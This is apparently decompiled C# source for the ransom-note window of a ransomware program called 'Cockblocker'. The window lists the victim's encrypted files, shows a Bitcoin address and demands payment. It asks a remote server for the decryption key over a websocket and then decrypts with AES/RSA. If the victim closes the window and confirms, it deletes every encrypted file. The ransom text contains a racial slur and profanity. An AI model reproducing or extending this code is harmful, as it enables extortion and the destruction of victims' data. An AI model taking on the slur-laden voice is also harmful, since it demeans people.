using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace Cockblocker;

public class RansomwareDisplay : Form
{
	private bool HasPaid;

	private IContainer components;

	private Label label2;

	private Button button1;

	private TextBox textBox1;

	private RichTextBox richTextBox1;

	private Label label1;

	private Label label4;

	private TextBox textBox2;

	private Button button2;

	private Label label3;

	public RansomwareDisplay()
	{
		InitializeComponent();
	}

	private void RansomwareDisplay_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Invalid comparison between Unknown and I4
		if (HasPaid)
		{
			return;
		}
		if ((int)MessageBox.Show("are you suuuuure you wanna do that???", "monica", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6)
		{
			foreach (string item in Globals.encrypted)
			{
				File.Delete(item);
			}
			return;
		}
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void RansomwareDisplay_Load(object sender, EventArgs e)
	{
		Globals.ShowWindow(Globals.GetConsoleWindow(), 5);
		((Control)textBox2).set_Text(Globals.BitcoinAddr);
		string[] array = new string[6] { "like I would become a monster...", "made by monica", "made by hannah", "woop woop", "savage babies", "greetz to justquant" };
		((Control)label4).set_Text(array[new Random().Next(array.Length - 1)]);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		Globals.ws.Send(JsonConvert.SerializeObject((object)new Globals.cmd("private_key", ((Control)textBox1).get_Text())));
		MessageBox.Show("decryption attempt");
		foreach (string item in Globals.encrypted)
		{
			try
			{
				if (Globals.Keys.PrivateKey != null)
				{
					HasPaid = true;
					Console.WriteLine("decrypting " + item);
					Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(item));
					File.WriteAllBytes(item, EncryptionEngine.Decrypt_File_AESRSA(encoded, Globals.Keys.PrivateKey));
					File.Move(item, Path.ChangeExtension(item, null));
					continue;
				}
				HasPaid = false;
				break;
			}
			catch
			{
			}
		}
	}

	private void RansomwareDisplay_Shown(object sender, EventArgs e)
	{
		((TextBoxBase)richTextBox1).set_Lines(Globals.encrypted.ToArray());
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		Globals.ws.Send(JsonConvert.SerializeObject((object)new Globals.cmd("private_key", "bitcoin")));
		MessageBox.Show("decryption attempt");
		foreach (string item in Globals.encrypted)
		{
			try
			{
				if (Globals.Keys.PrivateKey != null)
				{
					HasPaid = true;
					Console.WriteLine("decrypting " + item);
					Tuple<byte[], byte[]> encoded = JsonConvert.DeserializeObject<Tuple<byte[], byte[]>>(File.ReadAllText(item));
					File.WriteAllBytes(item, EncryptionEngine.Decrypt_File_AESRSA(encoded, Globals.Keys.PrivateKey));
					File.Move(item, Path.ChangeExtension(item, null));
					continue;
				}
				HasPaid = false;
				break;
			}
			catch
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Expected O, but got Unknown
		//IL_0296: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a0: Expected O, but got Unknown
		//IL_0528: Unknown result type (might be due to invalid IL or missing references)
		//IL_0532: Expected O, but got Unknown
		label2 = new Label();
		button1 = new Button();
		textBox1 = new TextBox();
		richTextBox1 = new RichTextBox();
		label1 = new Label();
		label4 = new Label();
		textBox2 = new TextBox();
		button2 = new Button();
		label3 = new Label();
		((Control)this).SuspendLayout();
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Comic Sans MS", 21.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(147, 9));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(615, 80));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("Yo file's been encrypted nigga\r\nPays me a bitcoin and I unencrypt them fam\r\n");
		label2.set_TextAlign((ContentAlignment)32);
		((Control)button1).set_Location(new Point(12, 283));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(143, 22));
		((Control)button1).set_TabIndex(4);
		((Control)button1).set_Text("Use Decryption Code");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(12, 311));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(143, 20));
		((Control)textBox1).set_TabIndex(5);
		((Control)richTextBox1).set_Location(new Point(12, 116));
		((Control)richTextBox1).set_Name("richTextBox1");
		((Control)richTextBox1).set_Size(new Size(361, 96));
		((Control)richTextBox1).set_TabIndex(6);
		((Control)richTextBox1).set_Text("");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 97));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(79, 13));
		((Control)label1).set_TabIndex(7);
		((Control)label1).set_Text("Encrypted Files");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Comic Sans MS", 27.75f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(322, 282));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(562, 52));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("like i would become a monster");
		((Control)textBox2).set_Location(new Point(379, 151));
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(540, 20));
		((Control)textBox2).set_TabIndex(10);
		((Control)button2).set_Location(new Point(551, 178));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(164, 81));
		((Control)button2).set_TabIndex(11);
		((Control)button2).set_Text("i fuckin paid give me my files");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(380, 132));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(83, 13));
		((Control)label3).set_TabIndex(12);
		((Control)label3).set_Text("Bitcoin Address:");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(931, 343));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)richTextBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).set_Name("RansomwareDisplay");
		((Control)this).set_Text("Cockblocker ");
		((Form)this).add_FormClosing(new FormClosingEventHandler(RansomwareDisplay_FormClosing));
		((Form)this).add_Load((EventHandler)RansomwareDisplay_Load);
		((Form)this).add_Shown((EventHandler)RansomwareDisplay_Shown);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
